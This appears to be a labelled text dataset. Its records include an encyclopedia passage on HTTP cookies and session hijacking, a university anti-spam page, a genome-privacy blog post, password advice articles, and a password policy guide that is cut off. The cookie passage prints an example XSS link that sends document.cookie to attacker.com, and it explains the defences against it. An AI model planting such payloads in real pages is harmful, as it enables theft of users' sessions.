used to keep track of a user’s input when filling online forms or as a shopping cart.\n- First party analytics cookies are not likely to create a privacy risk if websites provide clear information about the cookies to users and privacy safeguards.\nThe industry’s response has been largely negative. Some viewed the Directive as an infernal doomsday machine that will \"kill online sales\" and \"kill the internet\". Robert Bond of the law firm Speechly Bircham describes the effects as \"far-reaching and incredibly onerous\" for \"all UK companies.\" Simon Davis of Privacy International argues that proper enforcement would \"destroy the entire industry.\"\nThird-party cookies can be blocked by most browsers to increase privacy and reduce tracking by advertising and tracking companies without negatively affecting the user's Web experience. Many advertising operators have an opt-out option to behavioural advertising, with a generic cookie in the browser stopping behavioural advertising.\nCookie theft and session hijacking \n||This section has multiple issues. Please help improve it or discuss these issues on the talk page.\nListed here are various scenarios of cookie theft and user session hijacking (even without stealing user cookies) which work with websites which rely solely on HTTP cookies for user identification.\nNetwork eavesdropping \nTraffic on a network can be intercepted and read by computers on the network other than the sender and receiver (particularly over unencrypted open Wi-Fi). This traffic includes cookies sent on ordinary unencrypted HTTP sessions. Where network traffic is not encrypted, attackers can therefore read the communications of other users on the network, including HTTP cookies as well as the entire contents of the conversations, for the purpose of a man-in-the-middle attack.\nAn attacker could use intercepted cookies to impersonate a user and perform a malicious task, such as transferring money out of the victim’s bank account.\nThis issue can be resolved by securing the communication between the user's computer and the server by employing Transport Layer Security (HTTPS protocol) to encrypt the connection. A server can specify the Secure flag while setting a cookie, which will cause the browser to send the cookie only over an encrypted channel, such as an SSL connection.\nPublishing false sub-domain – DNS cache poisoning \nVia DNS cache poisoning, an attacker might be able to cause a DNS server to cache a fabricated DNS entry, say\nf12345.www.example.com with the attacker’s server IP address. The attacker can then post an image URL from his own server (for example,\nhttp://f12345.www.example.com/img_4_cookie.jpg). Victims reading the attacker’s message would download this image from\nf12345.www.example.com is a sub-domain of\nwww.example.com, victims’ browsers would submit all\nexample.com-related cookies to the attacker’s server; the compromised cookies would also include HttpOnly cookies.[clarification needed]\nThis vulnerability is usually for Internet Service Providers to fix, by securing their DNS servers. But it can also be mitigated if\nwww.example.com is using Secure cookies. Victims’ browsers will not submit Secure cookies if the attacker’s image is not using encrypted connections. If the attacker chose to use HTTPS for his img_4_cookie.jpg download, he would have the challenge of obtaining an SSL certificate for\nf12345.www.example.com from a Certificate Authority. Without a proper SSL certificate, victims’ browsers would display (usually very visible) warning messages about the invalid certificate, thus alerting victims as well as security officials from\nwww.example.com (the latter would require someone to inform the security officials).\nAs an example, an attacker may post a message on\nwww.example.com with the following link:\n<a href=\"#\" onclick=\"window.location='http://attacker.com/stole.cgi?text='+escape(document.cookie); return false;\">Click here!</a>\nWhen another user clicks on this link, the browser executes the piece of code within the\nonclick attribute, thus replacing the string\ndocument.cookie with the list of cookies of the user that are active for the page. As a result, this list of cookies is sent to the\nattacker.com server. If the attacker’s posting is on\nhttps://www.example.com/somewhere, secure cookies will also be sent to attacker.com in plain text.\nCross-site scripting is a constant threat, as there are always some crackers trying to find a way of slipping in script tags to websites. It is the responsibility of the website developers to filter out such malicious code.\nIn the meantime, such attacks can be mitigated by using HttpOnly cookies. These cookies will not be accessible by client side script, and therefore, the attacker will not be able to gather these cookies.\nCross-site scripting \nIf an attacker was able to insert a piece of script to a page on\nwww.example.com, and a victim’s browser was able to execute the script, the script could simply carry out the attack. This attack would use the victim’s browser to send HTTP requests to servers directly; therefore, the victim’s browser would submit all relevant cookies, including HttpOnly cookies, as well as Secure cookies if the script request is on HTTPS.\nFor example, on MySpace, Samy posted a short message “Samy is my hero” on his profile, with a hidden script to send Samy a “friend request” and then post the same message on the victim’s profile. A user reading Samy’s profile would send Samy a “friend request” and post the same message on this person’s profile. Then, the third person reading the second person’s profile would do the same. Pretty soon, this Samy worm became one of the fastest spreading worms of all time.\nThis type of attack (with automated scripts) would not work if a website had CAPTCHA to challenge client requests.\nCross-site scripting – proxy request \nIn older versions of browsers, there were security holes allowing attackers to script a proxy request by using XMLHttpRequest. For example, a victim is reading an attacker’s posting on\nwww.example.com, and the attacker’s script is executed in the victim’s browser. The script generates a request to\nwww.example.com with the proxy server\nattacker.com. Since the request is for\nexample.com cookies will be sent along with the request, but routed through the attacker’s proxy server, hence, the attacker can harvest the victim’s cookies.\nThis attack would not work for Secure cookie, since Secure cookies go with HTTPS connections, and its protocol dictates end-to-end encryption, i.e., the information is encrypted on the user’s browser and decrypted on the destination server\nwww.example.com, so the proxy servers would only see encrypted bits and bytes.\nCross-site request forgery \nFor example, Bob might be browsing a chat forum where another user, Mallory, has posted a message. Suppose that Mallory has crafted an HTML image element that references an action on Bob's bank's website (rather than an image file), e.g.,\nIf Bob's bank keeps his authentication information in a cookie, and if the cookie hasn't expired, then the attempt by Bob's browser to load the image will submit the withdrawal form with his cookie, thus authorizing a transaction without Bob's approval.\nBesides privacy concerns, cookies also have some technical drawbacks. In particular, they do not always accurately identify users, they can be used for security attacks, and they are often at odds with the Representational State Transfer (REST) software architectural style.\nInaccurate identification \nIf more than one browser is used on a computer, each usually has a separate storage area for cookies. Hence cookies do not identify a person, but a combination of a user account, a computer, and a Web browser. Thus, anyone who uses multiple accounts, computers, or browsers has multiple sets of cookies.\nLikewise, cookies do not differentiate between multiple users who share the same user account, computer, and browser.\nInconsistent state on client and server \nInconsistent support by devices \nThe problem with using mobile cookies is that most devices do not implement cookies; for example, Nokia only supports cookies on 60% of its devices, while Motorola only supports cookies on 45% of its phones. In addition, some gateways and networks (Verizon, Alltel, and MetroPCS) strip cookies, while other networks simulate cookies on behalf of their mobile devices. There are also dramatic variations in the wireless markets around the world; for example, in the United Kingdom 94% of the devices support wireless cookies, while in the United States only 47% support them.\nThe support for cookies is greater in the Far East, where wireless devices are more commonly used to access the web. Mobile cookies is a practice already in place in Japan, so that whether watching a podcast, a video, TV, clicking on a loan calculator or a GPS map—on almost all wireless devices—cookies can be set for tracking and capturing wireless behaviors.\nSome of the operations that can be done using cookies can also be done using other mechanisms.\nIP address \nSome users may be tracked based on the IP address of the computer requesting the page. The server knows the IP address of the computer running the browser or the proxy, if any is used, and could theoretically link a user's session to this IP address.\nIP addresses are, generally, not a reliable way to track a session or identify a user. Many computers designed to be used by a single user, such as office PCs or home PCs, are behind a network address translator (NAT). This means that several PCs will share a public IP address. Furthermore, some systems, such as Tor, are designed to retain Internet anonymity, rendering tracking by IP address impractical, impossible, or a security risk.\nURL (query string) \nA more precise technique is based on embedding information into URLs. The query string part of the URL is the one that is typically used for this purpose, but other parts can be used as well. The Java Servlet and PHP session mechanisms both use this method if cookies are not enabled.\nThis method consists of the Web server appending query strings to the links of a Web page it holds when sending it to a browser. When the user follows a link, the browser returns the attached query string to the server.\nQuery strings used in this way and cookies are very similar, both being arbitrary pieces of information chosen by the server and sent back by the browser. However, there are some differences: since a query string is part of a URL, if that URL is later reused, the same attached piece of information is sent to the server. For example, if the preferences of a user are encoded in the query string of a URL and the user sends this URL to another user by e-mail, those preferences will be used for that other user as well.\nMoreover, even if the same user accesses the same page two times, there is no guarantee that the same query string is used in both views. For example, if the same user arrives to the same page but coming from a page internal to the site the first time and from an external search engine the second time, the relative query strings are typically different while the cookies would be the same. For more details, see query string.\nOther drawbacks of query strings are related to security: storing data that identifies a session in a query string enables or simplifies session fixation attacks, referrer logging attacks and other security exploits. Transferring session identifiers as HTTP cookies is more secure.\nHidden form fields \nAnother form of session tracking is to use web forms with hidden fields. This technique is very similar to using URL query strings to hold the information and has many of the same advantages and drawbacks; and if the form is handled with the HTTP GET method, the fields actually become part of the URL the browser will send upon form submission. But most forms are handled with HTTP POST, which causes the form information, including the hidden fields, to be appended as extra input that is neither part of the URL, nor of a cookie.\nThis approach presents two advantages from the point of view of the tracker: first, having the tracking information placed in the HTML source and POST input rather than in the URL means it will not be noticed by the average user; second, the session information is not copied when the user copies the URL (to save the page on disk or send it via email, for example).\nThis method can be easily used with any framework that supports web forms.\nThe downside is that every separate window or tab will initially have an empty window.name; in times of tabbed browsing this means that individually opened tabs (initiation by user) will not have a window name. Furthermore window.name can be used for tracking visitors across different websites, making it of concern for Internet privacy.\nIn some respects this can be more secure than cookies due to not involving the server, so it is not vulnerable to network cookie sniffing attacks. However if special measures are not taken to protect the data, it is vulnerable to other attacks because the data is available across different websites opened in the same window or tab.\nHTTP authentication \nThe HTTP protocol includes the basic access authentication and the digest access authentication protocols, which allow access to a Web page only when the user has provided the correct username and password. If the server requires such credentials for granting access to a web page, the browser requests them from the user and, once obtained, the browser stores and sends them in every subsequent page request. This information can be used to track the user.\nSee also \n- Dynamic HTML\n- Local Shared Object – Flash Cookies\n- Session Beans\n- Session (computer science)\n- Session ID\n- Web server session management\n- Web Storage and DOM Storage\n- Web visitor tracking\n- Zombie cookie\n- \"HTTP State Management Mechanism – Overview\". IETF. April 2011.\n- Penenberg, Adam; Cookie Monsters, Slate, November 7, 2005. \"Cookies are not software. They can't be programmed, can't carry viruses, and can't unleash malware to go wilding through your hard drive.\"\n- \"New net rules set to make cookies crumble\". BBC. 2011-03-08.\n- \"Sen. Rockefeller: Get Ready for a Real Do-Not-Track Bill for Online Advertising\". Adage.com. 2011-05-06.\n- Peng, Weihong; Cisna, Jennifer (2000). \"HTTP cookies - a promising technology\". Proquest. Online Information Review. Retrieved 29 March 2013.\n- Vamosi, Robert (2008-04-14). \"Gmail cookie stolen via Google Spreadsheets\".\n- Schwartz, John (2001-09-04). \"Giving Web a Memory Cost Its Users Privacy\". The New York Times.\n- Kesan, Jey; and Shah, Rajiv ; Deconstructing Code, SSRN.com, chapter II.B (Netscape's cookies), Yale Journal of Law and Technology, 6, 277–389\n- Kristol, David; HTTP Cookies: Standards, privacy, and politics, ACM Transactions on Internet Technology, 1(2), 151–198, 2001 doi:10.1145/502152.502153 (an expanded version is freely available at arXiv:cs/0105018v1 [cs.SE])\n- \"Press Release: Netscape Communications Offers New Network Navigator Free On The Internet\". Web.archive.org. Archived from the original on 2006-12-07. Retrieved 2010-05-22.\n- \"Usenet Post by Marc Andreessen: Here it is, world!\". Groups.google.com. 1994-10-13. Retrieved 2010-05-22.\n- Hardmeier, Sandi (2005-08-25). \"The history of Internet Explorer\". Microsoft. Retrieved 2009-01-04.\n- Jackson, T (1996-02-12). \"This Bug in Your PC is a Smart Cookie\". Financial Times.\n- \"Maintaining session state with cookies\". Microsoft Developer Network. Retrieved 22 October 2012.\n- Rouse, Margaret (September 2005). \"Transient cookie (session cookie)\". SearchSOA. TechTarget. Retrieved 22 October 2012.\n- OWASP Browsers Supporting HttpOnly\n- IETF HTTP State Management Mechanism – Apr, 2011 Obsoletes RFC 2965\n- Böttiger, Arvid (2011). \"HTTP-Only cookies - Brought to you by Internet Explorer 6\".\n- Mayer, Jonathan. \"Tracking the Trackers: Microsoft Advertising\". The Center for Internet and Society. Retrieved 28 September 2011.\n- Burt, David. \"Update on the issue of ‘supercookies’ used on MSN\". Retrieved 28 September 2011.\n- Jim Manico quoting Daniel Stenberg, Real world cookie length limits\n- \"Persistent client state HTTP cookies: Preliminary specification\". Netscape. c1999. Archived from the original on 2007-08-05.\n- RFC 2965 – HTTP State Management Mechanism (IETF)\n- \"Cookie Property\". MSDN. Microsoft. Retrieved 2009-01-04.\n- Shannon, Ross (2007-02-26). \"Cookies — set and retrieve information about your readers\". HTMLSource. Retrieved 2009-01-04.\n- Innovative, Php (2011-09-02). \"Sharing Cookies Between Multiple Domains\". InnovativePhp. Retrieved 2011-09-02.\n- RFC 2616 - Hypertext Transfer Protocol - HTTP/1.1\n- Symantec Internet Security Threat Report: Trends for July–December 2007 (Executive Summary) (PDF) XIII. Symantec Corp. April 2008. pp. 1–3. Retrieved May 11, 2008.\n- Whalen, David (June 8, 2002). \"The Unofficial Cookie FAQ v2.6\". Cookie Central. Retrieved 2009-01-04.\n- \"3rd-Party Cookies, DOM Storage and Privacy\". grack.com: Matt Mastracci's blog. January 6, 2010. Retrieved 2010-09-20.\n- \"How to Manage Cookies in Internet Explorer 6\". Microsoft. December 18, 2007. Retrieved 2009-01-04.\n- \"Clearing private data\". Firefox Support Knowledge base. Mozilla. 16 September 2008. Retrieved 2009-01-04.\n- \"Clear Personal Information : Clear browsing data\". Google Chrome Help. Google. Retrieved 2009-01-04.\n- \"Clear Personal Information: Delete cookies\". Google Chrome Help. Google. Retrieved 2009-01-04.\n- \"Site Compatibility for Firefox 22\", Mozilla Developer Network, 2013-04-11\n- Miyazaki, Anthony D. (2008), “Online Privacy and the Disclosure of Cookie Use: Effects on Consumer Trust and Anticipated Patronage,” Journal of Public Policy & Marketing, 23 (Spring), 19–33\n- \"CIA Caught Sneaking Cookies\". CBS News. 2002-03-20.\n- \"Spy Agency Removes Illegal Tracking Files\". The New York Times. 2005-12-29.\n- \"EU Cookie Directive - Directive 2009/136/EC\". JISC Legal Information. Retrieved 31 October 2012.\n- Privacy and Electronic Communications Regulations. Information Commissioner's Office. 2012.\n- Directive 95/46/EC of the European Parliament and of the Council of 24 October 1995 on the protection of individuals with regard to the processing of personal data and on the free movement of such data. 1995-11-23. pp. P. 0031–0050. Retrieved 31 October 2012.\n- \"New EU cookie law (e-Privacy Directive)\". Retrieved 31 October 2012.\n- \"EU cookie law: stop whining and just get on with it\". Retrieved 31 October 2012.\n- \"A Loophole Big Enough for a Cookie to Fit Through\". Bits. The New York Times. Retrieved 31 January 2013.\n- Pegoraro, Rob (July 17, 2005). \"How to Block Tracking Cookies\". Washington Post. p. F07. Retrieved 2009-01-04.\n- Wired Hack Obtains 9 Bogus Certificates for Prominent Websites\n- Fielding, Roy (2000). \"Fielding Dissertation: CHAPTER 6: Experience and Evaluation\". Retrieved 2010-10-14.\n- Tilkov, Stefan (July 2, 2008). \"REST Anti-Patterns\". InfoQ. Retrieved 2009-01-04.\n- Mena, Jesús (2011). Machine Learning Forensics for Law Enforcement, Security, and Intelligence. Boca Raton, FL: CRC Press (Taylor & Francis Group). ISBN 9-781-4398-6069-4.\n- \"ThomasFrank.se\". ThomasFrank.se. Retrieved 2010-05-22.\n- RFC 6265 – the official specification for HTTP cookies\n- HTTP cookies - Mozilla Developer Network\n- Using cookies via ECMAScript - Mozilla Developer Network\n- How Internet Cookies Work at HowStuffWorks\n- Information About Cookies from Microsoft\n- Cookies at the Electronic Privacy Information Center (EPIC)\n- Taking the Byte Out of Cookies: Privacy, Consent, and the Web (PDF)\n- Web handbook – Cookies from Delivery And Transformation Group, Cabinet Office, UK\n- Cookie-Based Counting Overstates Size of Web Site Audiences at ComScore\n- Don’t Tread on Our Cookies – The Web Privacy Manifesto at PBS\n- Mozilla Knowledge-Base: Cookies\n- AVG Blogs: What are Cookies", "label": 1}
{"text": "- Safety and Security\n- Network and Phone\n- Mobile Devices\nBlocking E-mail Spam\nNetwork Engineering uses several tools to help keep spam from reaching your mailbox. Read on for more information about what we are doing to prevent spam, what you can do, and how to keep your address off of spammers' lists.\nWhat is Spam?\nSpam is defined as unsolicited, bulk e-mail. Typically spam comes from strangers - people who have obtained your e-mail address without your permission. If you signed up for the mailing (intentionally or accidentally), it may be undesirable e-mail, but it is not technically spam. Likewise, if you have some sort of business relationship with the sender, it is not spam. So, an e-mail sent to you from your bank, an online service you signed up for, or your department at OSU would not be considered spam.\nNote: Using OSU's e-mail system to send unauthorized bulk mailings is against the Acceptable Use Policy. For information about how to do a bulk mailing at OSU correctly, please see the Guidelines for Release of E-mail Addresses.\nStep 1 - Using Filtering On Your Account\nStep 2 - Reporting Spam\nIf Step 1 doesn't stop the spam from coming through, you can report the spam to OSU Network Engineering:\nGreylisting works by sending a temporary failure message on the first attempt of a unique combination of sender IP, sender and recipient. Legitimate, properly-configured mail servers deal with a temporary failure by queuing the message and resending later (typically within 15 to 30 minutes). On subsequent attempts to send a message, the greylisting server allows the message to be delivered.\nGreylisting works as an effective method to prevent spam because spammers typically do not bother to queue mail. Rather they blast the spam out once and ignore delivery failures.\nThe downside of greylisting is that it may cause a legitimate message to be delayed. Messages may also appear to arrive out of order, as subsequent messages from the same sender are not delayed. Also some sites do not queue and redeliver messages properly.\nOSU addresses these issues by building up a comprehensive whitelist of allowed senders. If there are sites that you are concerned about, please send us a list at net (at) oregonstate.edu, and we will add them to the whitelist.\nNOTE: Greylisting does not apply to e-mail sent within OSU.\nReal-Time Black Hole Lists (RBLs)\nA RBL is a list of hosts that are known untrustworthy e-mail senders. When we receive email from one of these sites, we bounce the message back to the site with an explanation that they are in an RBL and a link with directions on how to get unlisted from it. In addition to RBLs, we have an access list of domain names and email addresses of known spammers that we reject mail from. We also block mail from dynamic IP ranges, because mail servers should never have a dynamic IP. Finally, we block mail from dialup users and cable modem users - these users must relay through their ISP's mail server (or they can relay through OSU with ONID authentication).\nWe use the following RBLs at OSU\n- Spamhaus.org PBL (pbl.spamhaus.org)\n- Spamhaus.org SBL (sbl.spamhaus.org)\n- Spamhaus.org XBL (xbl.spamhaus.org)\n- Dynablock (dynablock.njabl.org)\n- NJABL.ORG (dnsbl.njabl.org)\n- VIRBL - virus black list(virbl.dnsbl.bit.nl)\nIf you are having trouble receiving mail from another site because they are listed in one of our RBLs, please tell the person at the remote location to contact their e-mail administrator or ISP and give them the information in the bounce message that they received from OSU. Contact us at net(at)oregonstate.edu if the sending site is unable or unwilling to get unlisted - we may be able to help them get unlisted, or whitelist the site here.\nFor more information about phishing, please see the Phishing helpdoc page.\nOSU blocks e-mail messages that contain a reply-to address that goes to a known phisher. If practical, we will also \"poison DNS\" for links included in phishing e-mails, so that clicking the link will redirect you to a safe page instead.\nIf you respond in any way to a phishing e-mail that asks for your username and password, we will disable your account and ask you to reset your password. OSU has had several accounts become hacked in the past and these hacked accounts have been used to send hundreds of thousands of spam e-mails to OSU and to the world, causing serious e-mail disruption.\nNEVER respond to phishing e-mails!\nContent-Based Filtering & SpamAssassin\nContent-based filtering refers to sorting or deleting mail based on the content of the message itself. We do content-based tagging at the mail relays using SpamAssassin, and these tags can be used to filter spam in your e-mail client.\nMany e-mail clients now come with \"Junk Mail\" filters built-in, which you can turn on to help sort out the messages you don't want to see. When you use a junk mail filter, make sure that you set it to sort the unwanted mail into a junk folder, rather than your deleted items. That way, you can check the junk folder once in a while to make sure that no innocent e-mails have ended up there.\nSpamAssassin headers that you can filter on:\nX-Spam-Flag: YES (indicates that this message has a score of 5 or more)\nX-Spam-Level: ******** (the number of stars indicates the spam score)\nFor example, to filter all messages with a score of 3 or higher, you could create a rule in your email client to match on \"X-Spam-Level: ***\".\nHow to Keep Your E-mail Address Off Spam Lists\nThe best way to avoid being spammed is to be careful how you share your e-mail address. Every time that you sign up for something online and provide your e-mail address to do so, you are potentially sharing your contact information with not only that site, but with third parties as well.\nThe following are things you can do to keep your address off spammers' lists:\n- Don't sign up for work-at-home or other too-good-to-be-true offers; they are typically scams and your contact information will definitely go to spammers.\n- NEVER reply to spam or phishing emails. If you do, it verifies to the spammer that your address is a real working address and that makes it even more valuable to them (and makes it more likely that you will get more spam).\n- If you post your e-mail address on a publicly accesible website, try to obscure it in some way (e.g. bob(at)oregonstate.edu).\n- When signing up for various accounts online, uncheck the boxes that ask about putting you on their mailing list. Typically these will be checked by default.\nOSU Email Statistics\nWhere does spam come from?\nIn the past, most spam came from misconfigured mail servers or proxy servers. But today most spam comes from virus-infected personal computers, hacked e-mail accounts and free e-mail providers. See the Wikipedia article on Spam for more information about how spammers operate.\nOne very important thing that you can do in the fight against spam is to keep your computer up-to-date on software patches and anti-virus software. It's also a good idea to run a personal firewall. Use caution when opening e-mails from addresses you don't recognize, and always scan email attachments for viruses. If your computer has become noticeably slower, it's a good idea to run virus-detection software.\nFinally: NEVER share your password!", "label": 1}
{"text": "Shots - Health Blog\nThu October 11, 2012\nBioethicists Call For Privacy Protections For Personal Genomes\nWhen a stranger can gain access to someone's entire genetic code by picking up a used coffee cup, it presents a whole new thicket of concerns about privacy and security.\nActually, we're already there, though we're still in the early stages of what's shaping up, after all the years of hype, as a genuine revolution. Just take a look at Rob Stein's recent series on the $1,000 genome to see how far we've come and where we're headed.\nA sample of saliva taken from a coffee cup or a Q-tip is enough for technicians to reveal someone's genes, for better and for worse. Reuters' Sharon Begley points to EasyDNA, a California company, that's already doing ancestry, health and paternity testing on samples ranging from cigarette butts to licked stamps.\nAgainst that backdrop, the Presidential Commission for the Study of Bioethical Issues just released recommendations on how the country should proceed along the genomic path.\nYes, whole genome sequencing may help refine diagnosis and treatment, though there are still plenty of technical and medical hurdles to overcome before that's commonplace.\nBetween now and then, safeguards are needed before whole genome sequencing becomes widespread, the commission says. In a letter to President Obama, the commission chairs say the group, \"recommends strong baseline protections for whole genome sequence data to protect individual privacy and data security while also leaving ample room for data sharing opportunities that propel scientific and medical progress.\"\nSome specific ideas from the commission:\n- Federal and state governments should establish a \"floor of privacy protections covering whole genome sequence data regardless of how they were obtained.\"\n- Prohibit unauthorized whole genome sequencing without the consent of the person whose sample is being analyzed. (Hands off my coffee cup!)\n- The people who sequence your genome need to tell you up front that it's likely there will be potentially worrisome \"incidental findings\" in the results.\nSo-called incidentalomas are quite common when radiologists scan patients. Since everyone has genetic mutations, the whole genome sequences are bound to find something quirky on everyone. When obtaining your consent, the researchers, doctors or commercial genome sequencers need to explain when and how they'll tell you about those findings.", "label": 1}
{"text": "Damian Dovarganes/Associated Press\nDamian Dovarganes/Associated Press\nNEW YORK – Rarely does a week go by without news of another hacking incident, whether it’s Chinese hackers accused of breaking in to The New York Times’ computer systems or Burger King finding its Twitter account taken over by pranksters.\nSecurity threats aren’t new and have long been part of online life. But the increased attention on them makes now a good time to review ways you can protect yourself. If nothing here feels new, that’s good, as it means you’ve been doing the things you need to do to keep your accounts safe from hackers. Although there’s no way to completely eliminate threats, minimizing them will go a long way.\nOne of the best things you can do is to make sure your password is strong.\nIf someone’s able to guess the password to your email or Facebook account, that person can post or send embarrassing things on your behalf. Someone was able to access Burger King’s Twitter account recently and changed its profile picture to a McDonald’s logo. If a banking or Amazon account is involved, someone could pay bills or buy iPads under your name – with your money.\nWhat’s worse, getting a password to one account is often a stepping stone to a more serious breach. Someone can use your email or Facebook account to send spam and scam messages to your friends, for instance. And because many services let you reset your password by sending an email to your address on file, someone with access to your email account can reset passwords and gain access to all sorts of things. If the compromised password is one you use for work, someone can snoop around for files on your employer’s network with trade secrets or customers’ credit card numbers.\nHere are ways you can keep your password strong to ward off that initial intrusion:\nMake your password long. The recommended minimum is eight characters, but 14 is better and 25 is even better than that. Some services have character limits on passwords, though.\nUse combinations of letters and numbers, upper and lower case and symbols such as the exclamation mark. Some services won’t let you do all of that, but try to vary it as much as you can. “PaSsWoRd!43” is far better than “password43.”\nAvoid words that are in dictionaries, even if you add numbers and symbols. There are programs that can crack passwords by going through databases of known words. One trick is to add numbers in the middle of a word – as in “pas123swor456d” instead of “password123456.” Another is to think of a sentence and use just the first letter of each word – as in “tqbfjotld” for “the quick brown fox jumps over the lazy dog.”\nSubstitute characters. For instance, use the number 0 instead of the letter O, or replace the S with a dollar sign.\nAvoid easy-to-guess words, even if they aren’t in the dictionary. You shouldn’t use your name, company name or hometown, for instance. Avoid pets and relatives’ names, too. Likewise, avoid things that can be looked up, such as your birthday or ZIP code. But you might use that as part of a complex password. Try reversing your ZIP code or phone number and insert that into a string of letters. As a reminder, you should also avoid “password” as the password, or consecutive keys on the keyboard, such as “1234” or “qwerty.”\nNever reuse passwords on other accounts – with two exceptions. Over the years, I’ve managed to create hundreds of accounts. Many are for one-time use, such as when a newspaper website requires me to register to read the full story. It’s OK to use simple passwords and repeat them in those types of situations, as long as the password isn’t unlocking features that involve credit cards or posting on a message board. That will let you focus on keeping passwords to the more essential accounts strong.\nThe other exception is to log in using a centralized sign-on service such as Facebook Connect. Hulu, for instance, gives you the option of using your Facebook username and password instead of creating a separate one for the video site. This technically isn’t reusing your password, but a matter of Hulu borrowing the log-in system Facebook already has in place. The account information isn’t stored with Hulu. Facebook merely tells Hulu’s computers that it’s you. Of course, if you do this, it’s even more important to keep your Facebook password secure.\nHow do you keep track of these passwords? There are programs you can buy, if you’re willing to put your trust in them. I use an Excel spreadsheet, but I encrypt it with its own password – a rather complex one. I am well aware that if the file gets compromised, all my services go with it. In fact, I once had it on a USB drive, which I had in a backpack that got stolen. I had to spend several hours changing passwords on all my accounts, just in case someone managed to break the password to that file. As a precaution, don’t name that file “passwords.” Name it something generic and boring.\nIdeally, you’ll have a system for creating and remembering passwords without needing the spreadsheet. For example, you might have a string that’s constant, such as “?t7q1b9f8j2o0t0l1d!” (the acronym for “the quick brown fox jumps over the lazy dog” with my area code and ZIP code reversed and a few special characters put in). To vary it, you could add the first two letters of the website you are using to the front and the next four to the end. Or put the consonants in front and the vowels at the end, with every other letter capitalized and the letter O replaced with the number 0. So for Amazon, it would be “mZn?t7q1b9f8j2o 0t0l1d!Aa0.” Just try to guess that!\nOf course, I’m not smart enough to have a system like that for myself.\nWhatever system you adopt, it’s good to change your password – and system – from time to time. And if there’s reason to believe your password might have been compromised, change it immediately.\nOne other thing to be aware of: Many sites let you reset your password by answering a security question, such as the name of your pet or the name of your high school. Of course, these violate good password practices by requiring you to use something that can be easily looked up. Others ask for your favorite movie or hobby. That might not be easily looked up, but your tastes change over time. Furthermore, because these questions get repeated from site to site, the answers you use violate the rule against repeating passwords.\nI try to make these answers complex just like passwords, by adding numbers and special characters and making up responses. Unfortunately, some sites won’t let you do that, and you’ll be stopped if you try to enter a numeral when asked for a city name, for instance. These services will often send an email when a password gets reset this way, so be sure the address on file is current. Change your password and security questions immediately if you’re notified of a reset you didn’t initiate. You might want to contact the service as well.\nWhile you’re at it, make your username complex, too, if you’re allowed to choose one. Banking sites typically do.\nBeyond passwords, here are a few other things to help you stay safe:\nSoftware flaws. Many break-ins result from flaws in the software program you use, whether it’s the Windows or Mac operating system, a Web browser or a video player. It’s a good idea to let those programs automatically check for software updates, as those updates may contain fixes to known flaws. You can also check this government website to learn of the latest threats and fixes: http://us-cert.gov .\nMalicious software. Even if the software you’re using is flawless, hackers may create a security opening by tricking you into installing a malicious program. That can happen if you click on a bad email attachment or link in your email. In rare cases, visiting a problematic website can cause the software to download. Should malicious software get on your computer, a hacker might be able to use the opening to look around for sensitive data, or record your keystrokes to capture your complex passwords. To minimize the threat, use caution when visiting unknown sites or opening mysterious email.\nSecurity software. Many companies sell anti-virus and other software to protect your computer from malicious software. There’s a free one available at http://www.avg.com . Windows and Mac computers also come with firewalls to block some threats. Be sure it’s turned on.", "label": 1}
{"text": "Password Policy Guidelines\nThis document introduces the basic concepts of network authentication. In particular, it focuses on the use of login IDs and passwords to verify the identity of users. Various strategies for selecting strong, hard-to-guess passwords are then discussed.\nThe Role of Passwords in Authentication\nMost shared computer systems limit access to data and resources, based on the identity of users who request that access. Access control is therefore dependent on reliable user identification.\nAuthentication is the process of identifying users in a manner which makes it difficult for one user to impersonate another.\nA number of technologies are available for user authentication. The most popular authentication systems are:\n- Secret passwords.\n- Cryptographic certificates.\n- Smart cards.\n- Biometric devices (fingerprints, retina scans, head scans, etc.).\nSince they are the least expensive to implement, most systems rely on passwords to authenticate users. As well, passwords are often used in addition to physical or cryptographic proofs of identity to further strengthen security.\nThreats to Password Security\nA typical case involves a malicious user (M) trying to access a network resource for which M is not authorized. One of the easiest ways for M to access that network resource is to guess the password of a valid user (V).\nThere are several methods that M could use to guess V's password. First, M could use a computer program to try out possible values for V's password very quickly. M could also acquire V's password by watching as V enters it. M could literally watch V typing, or could use electronic means, such as installing software on V's computer to record his keystrokes, or installing a network analyzer to monitor V's keystrokes as they are transmitted over the network.\nMaking Passwords Hard to Guess\nThe responsibility of selecting a password that is hard to guess generally falls to users, like V.\nIf users choose a one-character password, and that character could be any uppercase letter, lowercase letter or digit, then there would be 62 possible passwords. Clearly, M could try all 62 possibilities very quickly.\nV could make his/her password harder to guess by using more characters. Using the same possible characters, there are 3844 possible two-character passwords, and 218340105584896 (about 218 trillion) 8-character passwords.\nEven if M could try out 5000 eight-character passwords per second, it would take, on average, 700 years for M to guess V's 8-character password. Clearly, longer passwords are more secure!\nUnfortunately, V might choose a long password based on something he knows - like his login ID, name or some dictionary word. If V does this, then instead of trying 218 trillion passwords, M could probably guess V's password after a few thousand attempts. If M uses a computer program to guess passwords, this will only take a few minutes.\nTo decrease the chances of M ever guessing his/her password, V must select a hard-to-guess, or strong password. A strong password must:\n- Be as long as possible (never shorter than 6 characters).\n- Include mixed-case letters, if possible.\n- Include digits and punctuation marks, if possible.\n- Not be based on any personal information.\n- Not be based on any dictionary word, in any language.\nWhile most shared systems can enforce at least some of these rules, almost none have features to enforce all of them.\nNo matter how many strength rules V uses, though, the persistent M will eventually guess V's password - given enough time. Thus, V must also:\n- Change his password regularly, in order to limit the amount of time available to M to guess it.\n- Never use the same password twice.\nSome systems have a password expiry feature, which forces V to change his password periodically.\nAs well, some systems incorporate a password history feature, which disallows V from reusing one of his last N passwords.\nWhen faced with a password history mechanism, some users may change their password N times, and return it to its original value, so as to avoid having to remember a new password value. To prevent this, systems should either have an unlimited-length password history, or prevent users from changing their password more than once daily.\nMaking Passwords Hard to Intercept\nWhen a user enters his/her password, it might be intercepted at his/her workstation (by a keyboard monitor program), on the network (by a packet sniffer program), or on the server he is accessing (by a Trojan Horse program).\nTo protect the user's workstation, a strong operating system must be installed, such as Unix or Windows NT. Furthermore, the workstation must be physically secured against tampering.\nIf an operating system without security features is used (such as DOS, Windows or MacOS), then an intruder only needs temporary physical access to the console to insert a keyboard monitor program. If the workstation is not physically secured, then an intruder can reboot even a secure operating system, restart the workstation from his own media, and insert the offending program.\nTo protect against network analysis attacks, both the workstation and server should be cryptographically secured. Examples of strong protocols are the encrypted Netware login and Kerberos. Some systems (like the Windows NT file server protocol -- SMB or CIFS) make an attempt at cryptography, but are easily defeated by cryptanalysis. Systems that make no effort to encrypt remote access sessions, such as mainframes and Unix hosts, can be trivially compromised by a 